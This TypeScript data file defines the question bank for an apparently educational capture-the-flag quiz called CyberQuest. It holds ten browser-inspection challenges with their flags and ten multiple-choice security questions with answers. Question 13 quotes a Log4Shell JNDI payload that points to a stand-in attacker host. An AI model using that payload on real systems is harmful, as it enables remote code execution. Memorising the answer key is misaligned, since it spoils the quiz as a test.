export interface Question {
  id: number
  type: 'mcq' | 'text'
  text: string
  options?: string[] // For MCQ questions
  answer: string // Correct answer for grading
}

export const questions: Question[] = [
  // Inspect Challenges (Text Input) - Questions 1-10
  {
    id: 1,
    type: 'text',
    text: 'There is a flag floating in the empty space of this page. It has no color, no size, and takes up zero pixels. Find it.',
    answer: 'CyberQuest{d15pl4y_n0n3_15_n0t_53cur3}'
  },
  {
    id: 2,
    type: 'text',
    text: 'The frontend developer left a note for the backend team about a temporary master password, but they thought they deleted it before pushing to production. Did they?',
    answer: 'CyberQuest{c0mm3nt5_l34k_d4t4}'
  },
  {
    id: 3,
    type: 'text',
    text: 'This page has a highly secure \'Download Flag\' button. It is currently locked and unclickable because your account lacks admin privileges. Break the lock.',
    answer: 'CyberQuest{cl13nt_51d3_rul35_4r3_l135}'
  },
  {
    id: 4,
    type: 'text',
    text: 'Your session token seems a bit unusually long. I wonder what the server is storing in there to remember who you are?',
    answer: 'CyberQuest{c00k135_4r3_pl41nt3xt}'
  },
  {
    id: 5,
    type: 'text',
    text: 'Modern browsers are great at remembering things locally so servers don\'t have to work as hard. The developer stored an API key offline to save bandwidth.',
    answer: 'CyberQuest{l0c4l_5t0r4g3_n3v3r_f0rg3t5}'
  },
  {
    id: 6,
    type: 'text',
    text: 'Every time you refresh this specific challenge page, the server responds. But it\'s not just sending back HTML; it\'s whispering a secret directly to your browser\'s metadata.',
    answer: 'CyberQuest{h34d3r5_c4nn0t_b3_h1dd3n}'
  },
  {
    id: 7,
    type: 'text',
    text: 'A decryption module has been loaded into the browser\'s global memory, but the UI button to trigger it was accidentally deleted. You\'ll have to call the function manually.',
    answer: 'CyberQuest{g00d_0ld_c0n50l3_h4ck1ng}'
  },
  {
    id: 8,
    type: 'text',
    text: 'The profile picture on this page failed to load. The browser thinks it\'s a broken image, but the network traffic tells a different story.',
    answer: 'CyberQuest{m1m3_typ3_m15m4tch}'
  },
  {
    id: 9,
    type: 'text',
    text: 'The flag is right here on the screen, but you can\'t highlight it with your mouse, and you can\'t copy-paste it. CSS pseudo-elements are playing tricks on you.',
    answer: 'CyberQuest{c55_b3f0r3_4nd_4ft3r}'
  },
  {
    id: 10,
    type: 'text',
    text: 'Look deep into the bundled JavaScript files that make this React app run. Sometimes, variables are initialized but never actually rendered to the screen.',
    answer: 'CyberQuest{50urc3_m4p5_r3v34l_4ll}'
  },
  // Logic & Analysis Challenges (MCQ) - Questions 11-20
  {
    id: 11,
    type: 'mcq',
    text: 'You dump a database and find that the CEO and the Intern have the exact same MD5 password hash: 5f4dcc3b5aa765d61d8327deb882cf99. What critical security control did the database administrator fail to implement before hashing the passwords?',
    options: ['Salting', 'Encryption', 'Key Derivation', 'Tokenization'],
    answer: 'Salting'
  },
  {
    id: 12,
    type: 'mcq',
    text: 'A password reset token is generated using this Python logic: token = MD5(username + time.time()). If an attacker requests a reset link for the admin account, what exact two pieces of data do they need to generate the exact same valid token themselves?',
    options: ['The admin\'s username and the exact time of the request', 'The admin\'s username and the server\'s secret key', 'The session ID and the admin\'s email address', 'The database password and the admin\'s username'],
    answer: 'The admin\'s username and the exact time of the request'
  },
  {
    id: 13,
    type: 'mcq',
    text: 'You notice a spike in traffic where the User-Agent string in the HTTP headers looks like this: ${jndi:ldap://evil.com/a}. The attacker isn\'t targeting the web frontend; what specific backend component are they trying to exploit with this payload?',
    options: ['The logging framework (Log4j)', 'The database connection pool', 'The reverse proxy server', 'The API rate limiter'],
    answer: 'The logging framework (Log4j)'
  },
  {
    id: 14,
    type: 'mcq',
    text: 'An attacker intercepts their JSON Web Token (JWT), changes their role from \'user\' to \'admin\', and sends it back. They do not know the server\'s secret key, but the server still accepts it. What algorithm did the attacker specify in the JWT header to successfully bypass the signature check?',
    options: ['None', 'HS256', 'RS256', 'HMAC'],
    answer: 'None'
  },
  {
    id: 15,
    type: 'mcq',
    text: 'A junior admin accidentally plugs both ends of an Ethernet cable into two different ports on the exact same unmanaged network switch. The network immediately crashes. What specific network event has the admin accidentally caused?',
    options: ['A broadcast storm', 'A MAC address collision', 'A spanning tree failure', 'A DHCP exhaustion'],
    answer: 'A broadcast storm'
  },
  {
    id: 16,
    type: 'mcq',
    text: 'A hacker finds an SQL injection point, but the website never displays any database errors or data on the screen. It only ever says \'User Found\' or \'User Not Found\'. What specific classification of SQL injection must the hacker use to extract data character-by-character by asking the database True/False questions?',
    options: ['Blind SQL Injection', 'Time-Based SQL Injection', 'Second-Order SQL Injection', 'Union-Based SQL Injection'],
    answer: 'Blind SQL Injection'
  },
  {
    id: 17,
    type: 'mcq',
    text: 'A user clicks a link that reads: https://secure-login.amazon.com-update.net/auth. Provide the exact root domain (and TLD) that this URL is actually sending the user to.',
    options: ['com-update.net', 'amazon.com', 'secure-login.amazon.com', 'amazon.com-update'],
    answer: 'com-update.net'
  },
  {
    id: 18,
    type: 'mcq',
    text: 'An API uses a custom MAC: hash(secret_key + user_message). An attacker intercepts a valid message and its hash. Without knowing the secret key, they append malicious data to the end of the message and generate a valid new hash. What is the specific name of this cryptographic attack?',
    options: ['Length Extension Attack', 'Padding Oracle Attack', 'Birthday Attack', 'Meet-in-the-Middle Attack'],
    answer: 'Length Extension Attack'
  },
  {
    id: 19,
    type: 'mcq',
    text: 'A developer accidentally hardcodes an API key, types git commit, realizes their mistake, deletes the key, and types git commit again before pushing to GitHub. Where exactly can an attacker still find the deleted API key?',
    options: ['In the Git commit history', 'In the .gitignore file', 'In the environment variables', 'In the GitHub Actions logs'],
    answer: 'In the Git commit history'
  },
  {
    id: 20,
    type: 'mcq',
    text: 'Alice and Bob generate RSA keys, but they accidentally use a weak random number generator. Their two public moduli (N_A and N_B) happen to share exactly one prime factor in common. What standard mathematical algorithm can an attacker use on N_A and N_B to instantly find that shared prime factor and break both keys?',
    options: ['The Euclidean Algorithm', 'Pollard\'s Rho Algorithm', 'The Quadratic Sieve', 'Fermat\'s Factorization Method'],
    answer: 'The Euclidean Algorithm'
  }
]
